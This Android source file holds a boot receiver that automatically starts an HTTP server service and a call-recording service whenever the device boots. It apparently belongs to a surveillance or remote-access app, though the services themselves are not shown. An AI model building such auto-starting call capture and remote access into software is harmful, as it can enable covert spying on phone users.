package com.security.ravan;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            // Start HTTP Server
            Intent serviceIntent = new Intent(context, HttpServerService.class);
            serviceIntent.setAction("START");

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }

            // Start Call Record Service for call detection
            Intent callServiceIntent = new Intent(context, CallRecordService.class);
            callServiceIntent.setAction("START_SERVICE");
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(callServiceIntent);
            } else {
                context.startService(callServiceIntent);
            }
        }
    }
}
